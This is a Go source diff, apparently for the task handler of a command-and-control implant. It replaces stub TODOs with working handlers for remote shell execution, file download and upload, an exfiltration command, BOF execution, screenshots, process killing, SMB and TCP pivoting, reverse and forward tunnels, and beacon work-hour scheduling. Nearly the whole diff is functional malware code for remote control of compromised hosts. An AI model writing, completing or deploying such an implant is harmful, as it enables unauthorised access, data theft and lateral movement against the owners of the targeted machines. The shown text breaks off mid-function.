@@ -1,10 +1,91 @@
 package main
 
 import (
+	"archive/zip"
+	"bytes"
+	"encoding/binary"
+	"errors"
 	"fmt"
+	"io"
+	"net"
 	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
 
+	"__NAME__/impl"
 	"__NAME__/protocol"
+)
+
+const (
+	winErrFileNotFound = 2
+	winErrAccessDenied = 5
+	winErrGenFailure   = 31
+	winErrUnsupported  = 50
+	winErrTimedOut     = 10060
+	winErrConnRefused  = 10061
+	winErrHostUnreach  = 10065
+
+	pivotTypeSMB        = 1
+	pivotTypeTCP        = 2
+	pivotTypeDisconnect = 10
+	reverseTunnelType   = 5
+)
+
+type memoryChunkBuffer struct {
+	TotalSize int
+	Data      []byte
+}
+
+var (
+	memoryStoreMu sync.Mutex
+	memoryStore   = make(map[uint32]*memoryChunkBuffer)
+)
+
+type diskEntry struct {
+	Letter byte
+	Type   uint32
+}
+
+type shellSession struct {
+	jobID    uint32
+	cmd      *exec.Cmd
+	stdin    io.WriteCloser
+	stdout   io.ReadCloser
+	closeOnce sync.Once
+}
+
+type tunnelSession struct {
+	id           uint32
+	tunnelType   uint32
+	conn         net.Conn
+	listener     net.Listener
+	serverPaused bool
+	closeOnce    sync.Once
+}
+
+type pivotSession struct {
+	id        uint32
+	kind      uint8
+	conn      net.Conn
+	pipe      *os.File
+	closeOnce sync.Once
+}
+
+var (
+	shellMu       sync.Mutex
+	shellSessions = make(map[uint32]*shellSession)
+
+	tunnelMu       sync.Mutex
+	tunnelSessions = make(map[uint32]*tunnelSession)
+	nextTunnelID   uint32 = 0x70000000
+
+	pivotMu       sync.Mutex
+	pivotSessions = make(map[uint32]*pivotSession)
 )
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -41,7 +122,7 @@ func TaskProcess(data []byte) []byte {
 			break
 		}
 
-		respData, taskIdParsed := dispatchCommand(r, cmdCode)
+		respData, taskIdParsed, respCmdCode := dispatchCommand(r, cmdCode)
 
 		// The taskId follows each command's packed data.
 		// If the handler consumed all command fields, the next 4 bytes are the taskId.
@@ -59,7 +140,10 @@ func TaskProcess(data []byte) []byte {
 		if respData != nil {
 			w := protocol.NewWriterBE()
 			w.WriteUint32(taskId)
-			w.WriteUint32(cmdCode)
+			if respCmdCode == 0 {
+				respCmdCode = cmdCode
+			}
+			w.WriteUint32(respCmdCode)
 			w.WriteRaw(respData)
 			inner = append(inner, w.Bytes()...)
 		}
@@ -78,37 +162,37 @@ func TaskProcess(data []byte) []byte {
 
 // dispatchCommand handles a single command from the LE-packed task stream.
 // It reads the command-specific fields from r.
-// Returns (response_data, taskId). taskId is 0 if not consumed here.
-func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
+// Returns (response_data, taskId, responseCmd). taskId is 0 if not consumed here.
+func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32, uint32) {
 	switch cmdCode {
 
 	case protocol.COMMAND_TERMINATE:
 		// Format: [uint32 subcode] — 1=thread, 2=process
 		_, _ = r.ReadUint32() // subcode
 		os.Exit(0)
-		return nil, 0
+		return nil, 0, 0
 
 	case protocol.COMMAND_PWD:
 		// No additional fields — taskId follows immediately.
 		cwd, err := os.Getwd()
 		if err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
 		w := protocol.NewWriterBE()
 		w.WriteString(cwd)
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_CD:
 		// Format: [string path]
 		path, _ := r.ReadString()
 		normPath := agent.NormalizePath(path)
 		if err := os.Chdir(normPath); err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
 		cwd, _ := os.Getwd()
 		w := protocol.NewWriterBE()
 		w.WriteString(cwd)
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_CAT:
 		// Format: [string path]
@@ -116,23 +200,22 @@ func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
 		normPath := agent.NormalizePath(path)
 		content, err := os.ReadFile(normPath)
 		if err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
 		w := protocol.NewWriterBE()
 		w.WriteString(path)
 		w.WriteBytes(content)
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_LS:
 		// Format: [string dir]
 		dir, _ := r.ReadString()
-		normDir := agent.NormalizePath(dir)
-		absPath, entries, err := agent.GetListing(normDir)
+		absPath, entries, err := listDirectory(dir)
 		if err != nil {
 			w := protocol.NewWriterBE()
 			w.WriteUint8(0) // result = error
-			w.WriteUint32(1)
-			return w.Bytes(), 0
+			w.WriteUint32(win32ErrorCode(err))
+			return w.Bytes(), 0, 0
 		}
 		w := protocol.NewWriterBE()
 		w.WriteUint8(1) // result = success
@@ -148,36 +231,36 @@ func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
 			w.WriteUint32(uint32(e.Date))
 			w.WriteString(e.Name)
 		}
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_MKDIR:
 		// Format: [string path]
 		path, _ := r.ReadString()
 		normPath := agent.NormalizePath(path)
 		if err := os.MkdirAll(normPath, 0755); err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
 		w := protocol.NewWriterBE()
 		w.WriteString(path)
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_RM:
 		// Format: [string path]
 		path, _ := r.ReadString()
 		normPath := agent.NormalizePath(path)
 		if err := os.RemoveAll(normPath); err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
-		return []byte{}, 0
+		return []byte{}, 0, 0
 
 	case protocol.COMMAND_MV:
 		// Format: [string src][string dst]
 		src, _ := r.ReadString()
 		dst, _ := r.ReadString()
 		if err := os.Rename(agent.NormalizePath(src), agent.NormalizePath(dst)); err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
-		return []byte{}, 0
+		return []byte{}, 0, 0
 
 	case protocol.COMMAND_COPY:
 		// Format: [string src][string dst]
@@ -185,7 +268,7 @@ func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
 		dst, _ := r.ReadString()
 		info, err := os.Stat(agent.NormalizePath(src))
 		if err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
 		if info.IsDir() {
 			err = agent.CopyDir(agent.NormalizePath(src), agent.NormalizePath(dst))
@@ -193,18 +276,47 @@ func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
 			err = agent.CopyFile(agent.NormalizePath(src), agent.NormalizePath(dst))
 		}
 		if err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
-		return []byte{}, 0
+		return []byte{}, 0, 0
 
-	case protocol.COMMAND_PS_LIST:
-		// No additional fields.
-		procs, err := agent.ListProcesses()
+	case protocol.COMMAND_DISKS:
+		drives, err := listDisks()
 		if err != nil {
 			w := protocol.NewWriterBE()
 			w.WriteUint8(0)
-			w.WriteUint32(1)
-			return w.Bytes(), 0
+			w.WriteUint32(win32ErrorCode(err))
+			return w.Bytes(), 0, 0
+		}
+		w := protocol.NewWriterBE()
+		w.WriteUint8(1)
+		w.WriteUint32(uint32(len(drives)))
+		for _, d := range drives {
+			w.WriteUint8(d.Letter)
+			w.WriteUint32(d.Type)
+		}
+		return w.Bytes(), 0, 0
+
+	case protocol.COMMAND_DOWNLOAD:
+		// Format: [string path]
+		path, _ := r.ReadString()
+		taskId, _ := r.ReadUint32()
+		normPath := agent.NormalizePath(path)
+		data, err := os.ReadFile(normPath)
+		if err != nil {
+			return systemErrorResponse(err), taskId, protocol.COMMAND_ERROR
+		}
+		queueDownloadSequence(taskId, taskId, path, data)
+		return nil, taskId, 0
+
+	case protocol.COMMAND_PS_LIST:
+		// No additional fields.
+		procs, err := listProcesses()
+		if err != nil {
+			w := protocol.NewWriterBE()
+			w.WriteUint8(0)
+			w.WriteUint32(win32ErrorCode(err))
+			return w.Bytes(), 0, 0
 		}
 		w := protocol.NewWriterBE()
 		w.WriteUint8(1) // result = success
@@ -227,28 +339,24 @@ func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
 			w.WriteString(p.Username)
 			w.WriteString(p.Name)
 		}
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_PS_KILL:
 		// Format: [uint32 pid]
 		pid, _ := r.ReadUint32()
 		proc, err := os.FindProcess(int(pid))
 		if err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
 		if err := proc.Kill(); err != nil {
-			return errorResponse(err.Error()), 0
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
 		}
-		return []byte{}, 0
+		return []byte{}, 0, 0
 
 	case protocol.COMMAND_GETUID:
 		// No additional fields.
-		username := os.Getenv("USER")
-		if username == "" {
-			username = os.Getenv("USERNAME")
-		}
-		domain := os.Getenv("USERDOMAIN")
-		elevated := agent.IsElevated()
+		username, domain := currentIdentity()
+		elevated := isElevatedLocal()
 		high := uint8(0)
 		if elevated {
 			high = 1
@@ -257,56 +365,328 @@ func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
 		w.WriteUint8(high)
 		w.WriteString(domain)
 		w.WriteString(username)
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_PROFILE:
 		// Format: [uint32 subcmd][subcmd-specific fields]
 		subcmd, _ := r.ReadUint32()
-		return handleProfile(r, subcmd), 0
+		return handleProfile(r, subcmd), 0, 0
 
 	case protocol.COMMAND_JOB_LIST:
-		// No additional fields. Return empty list.
+		// No additional fields.
 		w := protocol.NewWriterBE()
-		w.WriteUint32(0) // count = 0
-		return w.Bytes(), 0
+		list := jobs.List()
+		w.WriteUint32(uint32(len(list)))
+		for _, job := range list {
+			w.WriteUint32(job.JobId)
+			w.WriteUint16(uint16(job.JobType))
+			w.WriteUint16(0)
+		}
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_JOBS_KILL:
 		// Format: [uint32 jobId]
 		jobId, _ := r.ReadUint32()
-		// TODO: implement job kill logic
 		w := protocol.NewWriterBE()
-		w.WriteUint8(0)           // result = not found
+		if jobs.Kill(jobId) {
+			closeShellSession(jobId)
+			w.WriteUint8(1)
+		} else {
+			w.WriteUint8(0)
+		}
 		w.WriteUint32(uint32(jobId))
-		return w.Bytes(), 0
+		return w.Bytes(), 0, 0
 
 	case protocol.COMMAND_EXEC_BOF:
 		// Format: [bool async][string entryFunc][uint32 bofLen][raw bof][uint32 argsLen][raw args]
-		_, _ = r.ReadBool()    // async
+		async, _ := r.ReadBool()
 		_, _ = r.ReadString()  // entry function
 		bofLen, _ := r.ReadUint32()
-		_, _ = r.ReadRawBytes(int(bofLen))
+		bofData, _ := r.ReadRawBytes(int(bofLen))
 		argsLen, _ := r.ReadUint32()
-		_, _ = r.ReadRawBytes(int(argsLen))
-		// TODO: Integrate a COFF loader.
-		return errorResponse("BOF loader not yet implemented"), 0
+		argsData, _ := r.ReadRawBytes(int(argsLen))
+		taskId, _ := r.ReadUint32()
+		if async {
+			jobID := jobs.Add(impl.JobTypeBof)
+			runAsyncDefaultBof(taskId, bofData, argsData, jobID)
+		} else {
+			queueSyncBof(taskId, bofData, argsData)
+		}
+		return nil, taskId, 0
 
 	case protocol.COMMAND_SAVEMEMORY:
 		// Format: [uint32 memoryId][uint32 totalSize][uint32 chunkSize][raw chunk]
-		_, _ = r.ReadUint32() // memoryId
-		_, _ = r.ReadUint32() // totalSize
+		memoryId, _ := r.ReadUint32()
+		totalSize, _ := r.ReadUint32()
 		chunkSize, _ := r.ReadUint32()
-		_, _ = r.ReadRawBytes(int(chunkSize))
-		// TODO: accumulate memory chunks for COMMAND_UPLOAD
-		return nil, 0
+		chunk, _ := r.ReadRawBytes(int(chunkSize))
+		memoryStoreMu.Lock()
+		buf, ok := memoryStore[memoryId]
+		if !ok {
+			buf = &memoryChunkBuffer{TotalSize: int(totalSize)}
+			memoryStore[memoryId] = buf
+		}
+		buf.Data = append(buf.Data, chunk...)
+		memoryStoreMu.Unlock()
+		return nil, 0, 0
 
-	// TODO: Implement remaining commands:
-	//   COMMAND_DOWNLOAD, COMMAND_UPLOAD, COMMAND_EXFIL,
-	//   COMMAND_LINK, COMMAND_UNLINK, COMMAND_PIVOT_EXEC,
-	//   COMMAND_PS_RUN, COMMAND_REV2SELF, COMMAND_DISKS,
-	//   COMMAND_SHELL_*, COMMAND_TUNNEL_*
+	case protocol.COMMAND_UPLOAD:
+		// Format: [uint32 memoryId][string remotePath]
+		memoryId, _ := r.ReadUint32()
+		remotePath, _ := r.ReadString()
+		normPath := agent.NormalizePath(remotePath)
+
+		memoryStoreMu.Lock()
+		buf, ok := memoryStore[memoryId]
+		if ok {
+			delete(memoryStore, memoryId)
+		}
+		memoryStoreMu.Unlock()
+
+		if !ok || len(buf.Data) == 0 {
+			return commandErrorResponse(winErrFileNotFound), 0, protocol.COMMAND_ERROR
+		}
+		if buf.TotalSize > 0 && len(buf.Data) > buf.TotalSize {
+			buf.Data = buf.Data[:buf.TotalSize]
+		}
+		if err := os.WriteFile(normPath, buf.Data, 0644); err != nil {
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
+		}
+		return []byte{}, 0, 0
+
+	case protocol.COMMAND_EXFIL:
+		// Format: [uint32 state][uint32 fileId]
+		state, _ := r.ReadUint32()
+		fileId, _ := r.ReadUint32()
+		w := protocol.NewWriterBE()
+		w.WriteUint32(fileId)
+		w.WriteUint8(uint8(state))
+		return w.Bytes(), 0, protocol.COMMAND_EXFIL
+
+	case protocol.COMMAND_EXIT:
+		// Format: [uint32 exitMethod]
+		_, _ = r.ReadUint32() // exitMethod (0=thread, 1=process)
+		os.Exit(0)
+		return nil, 0, 0
+
+	case protocol.COMMAND_KILL:
+		// Format: [uint32 pid]
+		pid, _ := r.ReadUint32()
+		proc, err := os.FindProcess(int(pid))
+		if err != nil {
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
+		}
+		if err := proc.Kill(); err != nil {
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
+		}
+		return []byte{}, 0, 0
+
+	case protocol.COMMAND_RUN:
+		// Format: [string program][string args][uint32 taskId]
+		program, _ := r.ReadString()
+		args, _ := r.ReadString()
+		taskId, _ := r.ReadUint32()
+		pid, err := startDetachedProcess(program, args)
+		if err != nil {
+			return systemErrorResponse(err), taskId, protocol.COMMAND_ERROR
+		}
+		w := protocol.NewWriterBE()
+		w.WriteUint32(uint32(pid))
+		w.WriteUint8(0)
+		w.WriteString(program)
+		return w.Bytes(), taskId, 0
+
+	case protocol.COMMAND_SCREENSHOT:
+		// No additional fields.
+		img, err := agent.CaptureScreenshot()
+		if err != nil {
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
+		}
+		w := protocol.NewWriterBE()
+		w.WriteBytes(img)
+		return w.Bytes(), 0, 0
+
+	case protocol.COMMAND_SHELL:
+		// Format: [string cmdLine]
+		cmdLine, _ := r.ReadString()
+		output, err := runShellCommand(cmdLine)
+		if err != nil {
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
+		}
+		w := protocol.NewWriterBE()
+		w.WriteString(output)
+		return w.Bytes(), 0, 0
+
+	case protocol.COMMAND_ZIP:
+		// Format: [string srcPath][string zipPath]
+		srcPath, _ := r.ReadString()
+		zipPath, _ := r.ReadString()
+		if err := zipToFile(srcPath, zipPath); err != nil {
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
+		}
+		w := protocol.NewWriterBE()
+		w.WriteString(zipPath)
+		return w.Bytes(), 0, 0
+
+	case protocol.COMMAND_LINK:
+		pivotType, _ := r.ReadUint32()
+		switch pivotType {
+		case pivotTypeSMB:
+			pipeName, _ := r.ReadString()
+			taskId, _ := r.ReadUint32()
+			payload, err := startPivotSMB(taskId, pipeName)
+			if err != nil {
+				return commandErrorResponse(win32ErrorCode(err)), taskId, protocol.COMMAND_ERROR
+			}
+			return payload, taskId, protocol.COMMAND_LINK
+		case pivotTypeTCP:
+			address, _ := r.ReadString()
+			port, _ := r.ReadUint32()
+			taskId, _ := r.ReadUint32()
+			payload, err := startPivotTCP(taskId, address, uint16(port))
+			if err != nil {
+				return commandErrorResponse(win32LikeNetError(err)), taskId, protocol.COMMAND_ERROR
+			}
+			return payload, taskId, protocol.COMMAND_LINK
+		default:
+			return unsupportedResponse(), 0, protocol.COMMAND_ERROR
+		}
+
+	case protocol.COMMAND_UNLINK:
+		pivotId, _ := r.ReadUint32()
+		taskId, _ := r.ReadUint32()
+		pivotType := closePivotSession(pivotId)
+		w := protocol.NewWriterBE()
+		w.WriteUint32(pivotId)
+		w.WriteUint8(pivotType)
+		return w.Bytes(), taskId, protocol.COMMAND_UNLINK
+
+	case protocol.COMMAND_PIVOT_EXEC:
+		pivotId, _ := r.ReadUint32()
+		payloadLen, _ := r.ReadUint32()
+		payload, _ := r.ReadRawBytes(int(payloadLen))
+		if err := writePivotData(pivotId, payload); err != nil {
+			return commandErrorResponse(win32LikeNetError(err)), 0, protocol.COMMAND_ERROR
+		}
+		return nil, 0, 0
+
+	case protocol.COMMAND_PS_RUN:
+		outputRequested, _ := r.ReadBool()
+		impersonation, _ := r.ReadBool()
+		_, _ = r.ReadUint32()
+		programArgs, _ := r.ReadString()
+		if outputRequested || impersonation {
+			return unsupportedResponse(), 0, protocol.COMMAND_ERROR
+		}
+		pid, err := startDetachedCommandLine(programArgs)
+		if err != nil {
+			return systemErrorResponse(err), 0, protocol.COMMAND_ERROR
+		}
+		w := protocol.NewWriterBE()
+		w.WriteUint32(uint32(pid))
+		w.WriteUint8(0)
+		w.WriteString(programArgs)
+		return w.Bytes(), 0, 0
+
+	case protocol.COMMAND_REV2SELF:
+		return []byte{}, 0, 0
+
+	case protocol.COMMAND_SHELL_START:
+		shellId, _ := r.ReadUint32()
+		programArgs, _ := r.ReadString()
+		if err := startShellSession(shellId, programArgs); err != nil {
+			w := protocol.NewWriterBE()
+			w.WriteUint8(protocol.JOB_TYPE_SHELL)
+			w.WriteUint8(protocol.JOB_STATE_FINISHED)
+			w.WriteUint32(win32LikeNetError(err))
+			return w.Bytes(), shellId, protocol.COMMAND_JOB
+		}
+		w := protocol.NewWriterBE()
+		w.WriteUint8(protocol.JOB_TYPE_SHELL)
+		w.WriteUint8(protocol.JOB_STATE_STARTING)
+		return w.Bytes(), shellId, protocol.COMMAND_JOB
+
+	case protocol.COMMAND_SHELL_WRITE:
+		shellId, _ := r.ReadUint32()
+		payloadLen, _ := r.ReadUint32()
+		payload, _ := r.ReadRawBytes(int(payloadLen))
+		if err := writeShellInput(shellId, payload); err != nil {
+			return commandErrorResponse(win32LikeNetError(err)), shellId, protocol.COMMAND_ERROR
+		}
+		return nil, shellId, 0
+
+	case protocol.COMMAND_SHELL_CLOSE:
+		shellId, _ := r.ReadUint32()
+		closeShellSession(shellId)
+		return nil, shellId, 0
+
+	case protocol.COMMAND_TUNNEL_START_TCP:
+		channelId, _ := r.ReadUint32()
+		tunnelType, _ := r.ReadUint32()
+		address, _ := r.ReadString()
+		port, _ := r.ReadUint32()
+		taskId, _ := r.ReadUint32()
+		payload, err := startTCPTunnel(channelId, tunnelType, address, uint16(port))
+		if err != nil {
+			return payload, taskId, protocol.COMMAND_TUNNEL_START_TCP
+		}
+		return payload, taskId, protocol.COMMAND_TUNNEL_START_TCP
+
+	case protocol.COMMAND_TUNNEL_START_UDP:
+		channelId, _ := r.ReadUint32()
+		address, _ := r.ReadString()
+		port, _ := r.ReadUint32()
+		taskId, _ := r.ReadUint32()
+		payload, _ := startUDPTunnel(channelId, address, uint16(port))
+		return payload, taskId, protocol.COMMAND_TUNNEL_START_TCP
+
+	case protocol.COMMAND_TUNNEL_WRITE_TCP:
+		channelId, _ := r.ReadUint32()
+		payloadLen, _ := r.ReadUint32()
+		payload, _ := r.ReadRawBytes(int(payloadLen))
+		if err := writeTunnelData(channelId, payload); err != nil {
+			queueTunnelClose(channelId, 0, win32LikeNetError(err))
+		}
+		return nil, channelId, 0
+
+	case protocol.COMMAND_TUNNEL_WRITE_UDP:
+		channelId, _ := r.ReadUint32()
+		payloadLen, _ := r.ReadUint32()
+		payload, _ := r.ReadRawBytes(int(payloadLen))
+		if err := writeTunnelData(channelId, payload); err != nil {
+			queueTunnelClose(channelId, 0, win32LikeNetError(err))
+		}
+		return nil, channelId, 0
+
+	case protocol.COMMAND_TUNNEL_CLOSE:
+		channelId, _ := r.ReadUint32()
+		closeTunnelSession(channelId)
+		return nil, channelId, 0
+
+	case protocol.COMMAND_TUNNEL_REVERSE:
+		tunnelId, _ := r.ReadUint32()
+		port, _ := r.ReadUint32()
+		taskId, _ := r.ReadUint32()
+		payload := startReverseTunnel(tunnelId, uint16(port))
+		return payload, taskId, protocol.COMMAND_TUNNEL_REVERSE
+
+	case protocol.COMMAND_TUNNEL_ACCEPT:
+		_, _ = r.ReadUint32()
+		return nil, 0, 0
+
+	case protocol.COMMAND_TUNNEL_PAUSE:
+		channelId, _ := r.ReadUint32()
+		setTunnelPaused(channelId, true)
+		return nil, channelId, 0
+
+	case protocol.COMMAND_TUNNEL_RESUME:
+		channelId, _ := r.ReadUint32()
+		setTunnelPaused(channelId, false)
+		return nil, channelId, 0
 
 	default:
-		return errorResponse(fmt.Sprintf("unknown command %d", cmdCode)), 0
+		_ = fmt.Sprintf("unknown command %d", cmdCode)
+		return unsupportedResponse(), 0, protocol.COMMAND_ERROR
 	}
 }
 
@@ -339,8 +719,7 @@ func handleProfile(r *protocol.ReaderLE, subcmd uint32) []byte {
 	case 4: // workingtime
 		wt, _ := r.ReadUint32()
 		stateMu.Lock()
-		// TODO: decode working time int into workStart/workEnd
-		_ = wt
+		workStart, workEnd = decodeWorkingTime(int(wt))
 		stateMu.Unlock()
 		w.WriteUint32(wt)
 
@@ -353,7 +732,6 @@ func handleProfile(r *protocol.ReaderLE, subcmd uint32) []byte {
 		w.WriteUint32(burstJitter)
 
 	case 6: // burst show
-		// TODO: return actual burst config
 		w.WriteUint32(0) // enabled
 		w.WriteUint32(50) // sleep ms
 		w.WriteUint32(0)  // jitter
@@ -362,9 +740,735 @@ func handleProfile(r *protocol.ReaderLE, subcmd uint32) []byte {
 }
 
 // errorResponse returns a generic error that the server logs but doesn't crash on.
-func errorResponse(msg string) []byte {
+func commandErrorResponse(code uint32) []byte {
 	w := protocol.NewWriterBE()
-	w.WriteUint32(1) // error code
-	w.WriteString(msg)
+	w.WriteUint32(code)
 	return w.Bytes()
+}
+
+func unsupportedResponse() []byte {
+	return commandErrorResponse(winErrUnsupported)
+}
+
+func systemErrorResponse(err error) []byte {
+	return commandErrorResponse(win32ErrorCode(err))
+}
+
+func win32ErrorCode(err error) uint32 {
+	switch {
+	case err == nil:
+		return 0
+	case errors.Is(err, os.ErrNotExist):
+		return winErrFileNotFound
+	case errors.Is(err, os.ErrPermission):
+		return winErrAccessDenied
+	default:
+		return winErrGenFailure
+	}
+}
+
+func listDirectory(path string) (string, []protocol.DirEntry, error) {
+	normPath := agent.NormalizePath(path)
+	absPath, err := filepath.Abs(normPath)
+	if err != nil {
+		return normPath, nil, err
+	}
+	entries, err := os.ReadDir(absPath)
+	if err != nil {
+		return absPath, nil, err
+	}
+	items := make([]protocol.DirEntry, 0, len(entries))
+	for _, entry := range entries {
+		info, err := entry.Info()
+		if err != nil {
+			continue
+		}
+		items = append(items, protocol.DirEntry{
+			Name:  entry.Name(),
+			IsDir: entry.IsDir(),
+			Size:  info.Size(),
+			Date:  info.ModTime().Unix(),
+		})
+	}
+	return absPath, items, nil
+}
+
+func listProcesses() ([]protocol.ProcessEntry, error) {
+	if runtime.GOOS == "windows" {
+		out, err := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
+		if err != nil {
+			return nil, err
+		}
+		lines := strings.Split(strings.TrimSpace(string(out)), "\n")
+		procs := make([]protocol.ProcessEntry, 0, len(lines))
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if line == "" {
+				continue
+			}
+			fields := parseCSVLine(line)
+			if len(fields) < 2 {
+				continue
+			}
+			pid, err := strconv.Atoi(strings.TrimSpace(fields[1]))
+			if err != nil {
+				continue
+			}
+			procs = append(procs, protocol.ProcessEntry{
+				Pid:       uint16(pid),
+				PPid:      0,
+				SessionId: 0,
+				IsArch64:  runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64",
+				Elevated:  false,
+				Domain:    os.Getenv("USERDOMAIN"),
+				Username:  os.Getenv("USERNAME"),
+				Name:      strings.Trim(fields[0], "\""),
+			})
+		}
+		return procs, nil
+	}
+
+	out, err := exec.Command("ps", "-eo", "pid=,ppid=,user=,comm=").Output()
+	if err != nil {
+		return nil, err
+	}
+	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
+	procs := make([]protocol.ProcessEntry, 0, len(lines))
+	for _, line := range lines {
+		fields := strings.Fields(line)
+		if len(fields) < 4 {
+			continue
+		}
+		pid, err := strconv.Atoi(fields[0])
+		if err != nil {
+			continue
+		}
+		ppid, _ := strconv.Atoi(fields[1])
+		procs = append(procs, protocol.ProcessEntry{
+			Pid:       uint16(pid),
+			PPid:      uint16(ppid),
+			SessionId: 0,
+			IsArch64:  runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64",
+			Elevated:  false,
+			Domain:    "",
+			Username:  fields[2],
+			Name:      fields[3],
+		})
+	}
+	return procs, nil
+}
+
+func currentIdentity() (string, string) {
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+	return username, os.Getenv("USERDOMAIN")
+}
+
+func isElevatedLocal() bool {
+	if runtime.GOOS == "windows" {
+		return exec.Command("cmd", "/C", "net", "session").Run() == nil
+	}
+	return os.Geteuid() == 0
+}
+
+func startDetachedProcess(program string, args string) (int, error) {
+	argv := splitArgs(args)
+	cmd := exec.Command(program, argv...)
+	if err := cmd.Start(); err != nil {
+		return 0, err
+	}
+	return cmd.Process.Pid, nil
+}
+
+func startDetachedCommandLine(commandLine string) (int, error) {
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command("cmd", "/C", commandLine)
+		if err := cmd.Start(); err != nil {
+			return 0, err
+		}
+		return cmd.Process.Pid, nil
+	}
+	cmd := exec.Command("/bin/sh", "-c", commandLine)
+	if err := cmd.Start(); err != nil {
+		return 0, err
+	}
+	return cmd.Process.Pid, nil
+}
+
+func runShellCommand(commandLine string) (string, error) {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", commandLine)
+	} else {
+		cmd = exec.Command("/bin/sh", "-c", commandLine)
+	}
+	out, err := cmd.CombinedOutput()
+	return string(out), err
+}
+
+func zipToFile(srcPath, zipPath string) error {
+	src := agent.NormalizePath(srcPath)
+	dst := agent.NormalizePath(zipPath)
+	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
+		return err
+	}
+	file, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	zw := zip.NewWriter(file)
+	defer zw.Close()
+
+	info, err := os.Stat(src)
+	if err != nil {
+		return err
+	}
+	if info.IsDir() {
+		return filepath.Walk(src, func(path string, info os.FileInfo, walkErr error) error {
+			if walkErr != nil {
+				return walkErr
+			}
+			rel, err := filepath.Rel(src, path)
+			if err != nil {
+				return err
+			}
+			if rel == "." {
+				return nil
+			}
+			name := filepath.ToSlash(rel)
+			if info.IsDir() {
+				_, err = zw.Create(name + "/")
+				return err
+			}
+			return addZipFile(zw, path, name)
+		})
+	}
+	return addZipFile(zw, src, filepath.Base(src))
+}
+
+func addZipFile(zw *zip.Writer, srcPath string, zipName string) error {
+	r, err := os.Open(srcPath)
+	if err != nil {
+		return err
+	}
+	defer r.Close()
+	w, err := zw.Create(filepath.ToSlash(zipName))
+	if err != nil {
+		return err
+	}
+	_, err = io.Copy(w, r)
+	return err
+}
+
+func decodeWorkingTime(value int) (int, int) {
+	if value == 0 {
+		return 0, 0
+	}
+	startHour := (value >> 24) & 0xff
+	startMin := (value >> 16) & 0xff
+	endHour := (value >> 8) & 0xff
+	endMin := value & 0xff
+	return startHour*100 + startMin, endHour*100 + endMin
+}
+
+func parseCSVLine(line string) []string {
+	var fields []string
+	var current bytes.Buffer
+	inQuotes := false
+	for i := 0; i < len(line); i++ {
+		ch := line[i]
+		switch ch {
+		case '"':
+			inQuotes = !inQuotes
+			current.WriteByte(ch)
+		case ',':
+			if inQuotes {
+				current.WriteByte(ch)
+			} else {
+				fields = append(fields, current.String())
+				current.Reset()
+			}
+		default:
+			current.WriteByte(ch)
+		}
+	}
+	fields = append(fields, current.String())
+	return fields
+}
+
+func splitArgs(line string) []string {
+	var args []string
+	var current strings.Builder
+	inQuotes := false
+	escape := false
+	for i := 0; i < len(line); i++ {
+		ch := line[i]
+		if escape {
+			current.WriteByte(ch)
+			escape = false
+			continue
+		}
+		switch ch {
+		case '\\':
+			escape = true
+		case '"':
+			inQuotes = !inQuotes
+		case ' ', '\t', '\r', '\n':
+			if inQuotes {
+				current.WriteByte(ch)
+			} else if current.Len() > 0 {
